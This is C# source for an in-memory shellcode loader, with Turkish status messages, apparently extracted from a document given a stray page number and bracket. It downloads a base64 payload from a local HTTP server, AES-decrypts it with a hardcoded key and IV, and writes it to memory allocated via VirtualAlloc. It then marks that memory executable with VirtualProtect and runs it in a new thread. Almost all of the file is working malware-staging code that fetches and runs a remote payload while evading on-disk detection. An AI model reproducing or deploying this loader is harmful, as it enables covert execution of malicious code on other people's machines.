using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net.Http;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Text;
namespace InMemoryExecutor
{
class ConsoleApp5
{
[DllImport("kernel32.dll")]
private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32
flAllocationType, UInt32 flProtect);
[DllImport("kernel32.dll")]
private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out
UInt32 lpflOldProtect);
[DllImport("kernel32.dll")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr
lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
[DllImport("kernel32.dll")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
static byte[] DecryptData(string encryptedData)
{
byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb,
0x07, 0x91, 0xd8, 0xc1, 0x97 };
byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5,
0xca, 0x82, 0xdf, 0xa5, 0xe2 };
Aes aes = Aes.Create();
ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
using (var msDecrypt = new MemoryStream(Convert.FromBase64String(encryptedData)))
using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
using (var msPlain = new MemoryStream())
{
csDecrypt.CopyTo(msPlain);
return msPlain.ToArray();
}
}
static async Task Main(string[] args)
{
try
{
string base64Data = await GetBase64FromPythonServerAsync();
Console.WriteLine(base64Data);
Console.ReadLine();
byte[] mProgramBytes = DecryptData(base64Data);
Console.WriteLine($"Base64 dönüşümü başarılı, uzunluk: {mProgramBytes.Length}");
51
IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)mProgramBytes.Length, 0x1000,
0x04);
if (lpStartAddress == IntPtr.Zero)
{
throw new Exception("Bellek ayırma işlemi başarısız oldu.");
}
Marshal.Copy(mProgramBytes, 0, lpStartAddress, mProgramBytes.Length);
)
UInt32 lpflOldProtect;
if (!VirtualProtect(lpStartAddress, (UInt32)mProgramBytes.Length, 0x20, out
lpflOldProtect))
{
throw new Exception("Bellek koruma izinleri değiştirilemedi.");
}
UInt32 lpThreadId = 0;
IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);
if (hThread == IntPtr.Zero)
{
throw new Exception("İş parçacığı başlatılamadı.");
}
WaitForSingleObject(hThread, 0xffffffff);
}
catch (Exception ex)
{
Console.WriteLine($"Error: {ex.Message}");
}
}
private static async Task<string> GetBase64FromPythonServerAsync()
{
using (HttpClient client = new HttpClient())
{
string url = "http://192.168.1.104:5000/get-base64-file";
HttpResponseMessage response = await client.GetAsync(url);
if (response.IsSuccessStatusCode)
{
var json = await response.Content.ReadAsStringAsync();
var startIndex = json.IndexOf("\"file\":") + 8;
var endIndex = json.IndexOf("\"", startIndex);
return json.Substring(startIndex, endIndex - startIndex);
}
else
{
throw new Exception("Python sunucusundan Base64 verisi alınamadı.");
}
}
}
}
}